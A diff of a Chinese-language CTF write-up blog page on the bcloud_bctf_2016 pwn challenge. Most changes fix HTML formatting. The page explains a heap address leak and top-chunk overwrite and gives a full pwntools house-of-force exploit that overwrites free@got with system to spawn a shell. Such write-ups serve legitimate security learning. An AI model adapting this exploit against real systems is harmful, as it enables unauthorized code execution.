@@ -12,14 +12,12 @@
 <li><code>strcpy</code>会一直拷贝源字符串，直到遇到<code>\x0a</code>或者<code>\x00</code>字符。并且在拷贝结束后，尾部添加一个<code>\x00</code>字符，很多<code>off by one</code>的题目就是基于此。</li>
 </ul>
 <span id="more"></span>
-
-
 <h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目的运行环境是<code>ubuntu 16</code>，使用<code>libc-2.23.so</code>。</p>
-<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403114227.png"><br><strong>注意</strong>：<code>arch</code>为<code>i386-32-little</code>。</p>
+<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403114227.png" alt=""><br><strong>注意</strong>：<code>arch</code>为<code>i386-32-little</code>。</p>
 <h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>很明显，这又是一个菜单题。首先来看<code>main</code>函数：</p>
-<h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162034.png"><br>在进入<code>while</code>循环之前，首先调用了<code>welcome</code>函数*引用与参考[1]*，然后再去执行循环体。继续来看一下<code>welcome</code>中有什么操作。</p>
-<h5 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162733.png"><br>这里面调了两个函数，继续分析</p>
-<h5 id="get-name"><a href="#get-name" class="headerlink" title="get_name"></a>get_name</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png"></p>
+<h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162034.png" alt=""><br>在进入<code>while</code>循环之前，首先调用了<code>welcome</code>函数<em>引用与参考[1]</em>，然后再去执行循环体。继续来看一下<code>welcome</code>中有什么操作。</p>
+<h5 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162733.png" alt=""><br>这里面调了两个函数，继续分析</p>
+<h5 id="get-name"><a href="#get-name" class="headerlink" title="get_name"></a>get_name</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png" alt=""></p>
 <p>这里面操作为：</p>
 <ul>
 <li>向栈变量<code>s</code>写入<code>0x40</code>大小的数据，有一个字节的溢出</li>
@@ -30,56 +28,56 @@
 <p>顺便放一下<code>read_off_by_one</code>函数和<code>put_info</code>函数：</p>
 <p><strong>read_off_by_one</strong>:</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163449.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163449.png" alt=""></p>
 </blockquote>
 <p><strong>put_info</strong>:</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163542.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163542.png" alt=""></p>
 </blockquote>
-<h5 id="get-org-host"><a href="#get-org-host" class="headerlink" title="get_org_host"></a>get_org_host</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png"></p>
+<h5 id="get-org-host"><a href="#get-org-host" class="headerlink" title="get_org_host"></a>get_org_host</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png" alt=""></p>
 <p>这里涉及到两次向栈变量上写数据，并且两次申请堆内存，两次调用<code>strcpy</code>接口。这里存在着溢出漏洞，后续<strong>漏洞点</strong>中会进一步分析。</p>
-<h5 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164026.png"></p>
-<h5 id="new-note"><a href="#new-note" class="headerlink" title="new_note"></a>new_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164143.png"></p>
+<h5 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164026.png" alt=""></p>
+<h5 id="new-note"><a href="#new-note" class="headerlink" title="new_note"></a>new_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164143.png" alt=""></p>
 <p>此住需要注意的点有：</p>
 <ul>
 <li><code>ptr_array</code>里面最多填满<code>10</code>个地址</li>
 <li>实际申请的<code>chunk</code>的大小是<code>size + 4</code>，能写的大小却是<code>size</code>，基本上不能使用<code>off by one</code></li>
 </ul>
-<h5 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164422.png"></p>
-<h5 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164539.png"></p>
+<h5 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164422.png" alt=""></p>
+<h5 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164539.png" alt=""></p>
 <p>从<code>ptr_array</code>数组和<code>ptr_size</code>数组中取出存储的地址和大小，并重新获取用户输入并写入数据。</p>
-<h5 id="del-note"><a href="#del-note" class="headerlink" title="del_note"></a>del_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164724.png"></p>
+<h5 id="del-note"><a href="#del-note" class="headerlink" title="del_note"></a>del_note</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403164724.png" alt=""></p>
 <p>释放指针指向的内存后直接将指针置为<code>0</code></p>
 <h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一开始看这个程序的时候，一直把目光对准了<code>while</code>循环体里面，几个关于<code>note</code>的函数，因为一般情况下，漏洞点会出现在这些函数里面，事实证明，<strong>惯性思维害死人</strong>。找了半天，啥洞也没找到，最后把目光聚焦在<code>welcome</code>里面的两个函数，才发现了利用点。接下来，详细讲一讲漏洞点。</p>
 <h5 id="漏洞点1：get-name泄露堆地址"><a href="#漏洞点1：get-name泄露堆地址" class="headerlink" title="漏洞点1：get_name泄露堆地址"></a>漏洞点1：get_name泄露堆地址</h5><p><strong>get_name</strong>:</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403162850.png" alt=""></p>
 </blockquote>
 <p>这里画一下栈内存与堆内存的变化：</p>
 <p><strong>填充内容前</strong>：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173227.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173227.png" alt=""></p>
 </blockquote>
 <p><strong>填充内容后</strong>：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173339.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403173339.png" alt=""></p>
 </blockquote>
 <p>因此，当填慢<code>0x40</code>个可见字符后，调用<code>put_info</code>打印内容的时候会把上面的<code>chunk</code>的地址给打印出来。</p>
 <h5 id="漏洞点2：get-org-host修改top-chunk的size域"><a href="#漏洞点2：get-org-host修改top-chunk的size域" class="headerlink" title="漏洞点2：get_org_host修改top chunk的size域"></a>漏洞点2：get_org_host修改top chunk的size域</h5><p><strong>get_org_host</strong>函数：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403163750.png" alt=""></p>
 </blockquote>
 <p><strong>填充前</strong>：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192414.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192414.png" alt=""></p>
 </blockquote>
 <p><strong>往栈变量<code>s</code>和<code>p</code>写了数据，并分配内存后</strong>：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192449.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192449.png" alt=""></p>
 </blockquote>
-<p>**执行两次<code>strcpy</code>**后：</p>
+<p><strong>执行两次<code>strcpy</code></strong>后：</p>
 <blockquote>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192924.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403192924.png" alt=""></p>
 </blockquote>
 <p>可以看到<code>top chunk</code>的<code>size</code>域被更改了。</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ul>
@@ -92,7 +90,7 @@
 <li>在<code>get_name</code>接口中，输入<code>0x40 * &#39;a&#39;</code>，泄露出堆地址</li>
 <li>通过<code>get_org_host</code>覆盖<code>top chunk</code>的<code>size</code>，修改为<code>0xffffffff</code>。</li>
 <li>利用<code>house of force</code>分配到<code>ptr_array</code>，即地址为<code>0x0x804b120</code>。</li>
-<li>连续分配4个用户大小为<code>0x44</code>大小的<code>chunk A、B、C、D</code>。那么，编辑<code>chunk A</code>的时候，就能直接修改<code>ptr_array</code>数组元素的地址。*引用与参考[2]*。</li>
+<li>连续分配4个用户大小为<code>0x44</code>大小的<code>chunk A、B、C、D</code>。那么，编辑<code>chunk A</code>的时候，就能直接修改<code>ptr_array</code>数组元素的地址。<em>引用与参考[2]</em>。</li>
 <li>调用<code>edit_note</code>，编辑<code>chunk A</code>，将<code>ptr_array[2]</code>设置为<code>free@got</code>，将<code>ptr_array[3]</code>设置为<code>printf@got</code>。</li>
 <li>调用<code>edit_note</code>，编辑<code>ptr_array[2]</code>的内容为<code>puts@plt</code>，就是将<code>free@got</code>修改为了<code>puts@plt</code>地址。</li>
 <li>调用<code>del_note</code>，去释放<code>ptr_array[3]</code>，实际上调用的是<code>puts</code>打印出来了<code>printf</code>的地址。</li>
@@ -102,36 +100,28 @@
 </ul>
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>定义好函数：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">size, content, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the length of the note content:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>, content)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span>(<span class="params">idx, content, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the new content:\n&quot;</span>, content)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span>(<span class="params">idx, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
-
 <p>执行<code>get_name</code>，泄露<code>heap</code>地址：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.sendafter(<span class="string">&quot;Input your name:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line">leak_heap_addr = u32(sh.recvn(<span class="number">4</span>))</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;leak_heap_addr&#x27;</span>, leak_heap_addr)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403215844.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403215844.png" alt=""></p>
 <p>执行<code>get_org_host</code>，修改<code>top chunk</code>的<code>size</code>为<code>0xffffffff</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.sendafter(<span class="string">&quot;Org:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;Host:\n&quot;</span>, p32(<span class="number">0xffffffff</span>) + (<span class="number">0x40</span> - <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;OKay! Enjoy:)\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220024.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220024.png" alt=""></p>
 <p>计算出<code>top chunk</code>的地址，分配到<code>0x804b120</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">top_chunk_addr = leak_heap_addr + <span class="number">0xd0</span></span><br><span class="line">ptr_array = <span class="number">0x804b120</span></span><br><span class="line">margin = ptr_array - top_chunk_addr</span><br><span class="line">new_note(margin - <span class="number">20</span>, <span class="string">&quot;&quot;</span>) <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220246.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220246.png" alt=""></p>
 <p>连续分配四块<code>chunk</code>，修改<code>free@got</code>的内容为<code>puts@plt</code>，泄露出<code>libc</code>的地址：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_got = <span class="number">0x804b014</span></span><br><span class="line">puts_plt = <span class="number">0x8048520</span></span><br><span class="line">printf_got = <span class="number">0x804b010</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_note(<span class="number">0x40</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">edit_note(<span class="number">1</span>, p32(<span class="number">0x804b120</span>) * <span class="number">2</span> + p32(free_got) + p32(printf_got))</span><br><span class="line">edit_note(<span class="number">2</span>, p32(puts_plt))</span><br><span class="line">del_note(<span class="number">3</span>)</span><br><span class="line">msg = sh.recvuntil(<span class="string">&quot;Delete success.\n&quot;</span>)</span><br><span class="line">printf_addr = u32(msg[:<span class="number">4</span>])</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;printf_addr&#x27;</span>, printf_addr)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220528.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220528.png" alt=""></p>
 <p>计算出<code>system</code>地址，修改<code>free@got</code>为<code>system</code>函数的地址，并准备好<code>/bin/sh</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr = printf_addr - offset</span><br><span class="line">edit_note(<span class="number">1</span>, p32(<span class="number">0x804b130</span>) * <span class="number">2</span> + p32(free_got) * <span class="number">2</span> + <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">edit_note(<span class="number">2</span>, p32(system_addr))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220618.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220618.png" alt=""></p>
 <p>释放带有<code>/bin/sh</code>的<code>chunk</code>，即可<code>getshell</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del_note(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220657.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210403220657.png" alt=""></p>
 <h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./bcloud_bctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> s, i:log.info(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">size, content, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the length of the note content:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>, content)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span>(<span class="params">idx, content, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the new content:\n&quot;</span>, content)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span>(<span class="params">idx, io:tube=sh</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Input your name:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">leak_heap_addr = u32(sh.recvn(<span class="number">4</span>))</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;leak_heap_addr&#x27;</span>, leak_heap_addr)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Org:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Host:\n&quot;</span>, p32(<span class="number">0xffffffff</span>) + (<span class="number">0x40</span> - <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;OKay! Enjoy:)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">top_chunk_addr = leak_heap_addr + <span class="number">0xd0</span></span><br><span class="line"></span><br><span class="line">ptr_array = <span class="number">0x804b120</span></span><br><span class="line">margin = ptr_array - top_chunk_addr</span><br><span class="line"></span><br><span class="line">new_note(margin - <span class="number">20</span>, <span class="string">&quot;&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x804b014</span></span><br><span class="line">puts_plt = <span class="number">0x8048520</span></span><br><span class="line">printf_got = <span class="number">0x804b010</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_note(<span class="number">0x40</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">1</span>, p32(<span class="number">0x804b120</span>) * <span class="number">2</span> + p32(free_got) + p32(printf_got))</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">2</span>, p32(puts_plt))</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">msg = sh.recvuntil(<span class="string">&quot;Delete success.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(msg[:<span class="number">4</span>])</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;printf_addr&#x27;</span>, printf_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> all_parsed_args[<span class="string">&#x27;debug_enable&#x27;</span>]:</span><br><span class="line">    offset =  <span class="number">0xe8d0</span> <span class="comment"># 0x10470</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">    libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">    LOG_ADDR(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    offset = libc.dump(<span class="string">&#x27;printf&#x27;</span>) - libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    LOG_ADDR(<span class="string">&#x27;offset&#x27;</span>, offset)</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - offset</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">1</span>, p32(<span class="number">0x804b130</span>) * <span class="number">2</span> + p32(free_got) * <span class="number">2</span> + <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">2</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 <h3 id="引用与参考"><a href="#引用与参考" class="headerlink" title="引用与参考"></a>引用与参考</h3><p>以下为引用与参考，可能以脚注的形式呈现！</p>
-<p>**[1]**：本文的函数均已重命名，原二进制文件不带符号信息</p>
-<p>**[2]**：其实这里可以直接去控制<code>ptr_size</code>数组，一直到<code>ptr_array</code>，这样还可以控制<code>size</code>，分配一个<code>chunk</code>就够操作了。</p>
+<p><strong>[1]</strong>：本文的函数均已重命名，原二进制文件不带符号信息</p>
+<p><strong>[2]</strong>：其实这里可以直接去控制<code>ptr_size</code>数组，一直到<code>ptr_array</code>，这样还可以控制<code>size</code>，分配一个<code>chunk</code>就够操作了。</p>
 </div><div class="article-licensing box"><div class="licensing-title"><p>bcloud_bctf_2016</p><p><a href="https://roderickchan.github.io/2021/04/03/bcloud-bctf-2016/">https://roderickchan.github.io/2021/04/03/bcloud-bctf-2016/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>乐乐</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-04-03</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-05-02</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a><a class="link-muted mr-2" rel="tag" href="/tags/house-of-force/">house of force</a><a class="link-muted mr-2" rel="tag" href="/tags/top-chunk/">top chunk</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=606007929c00ae0011d418d7&amp;product=inline-share-buttons" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/04/04/ycb-2020-babypwn/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ycb_2020_babypwn</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/04/02/pwn%E9%A2%98%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC/"><span class="level-item">pwn题命令行解题脚本</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 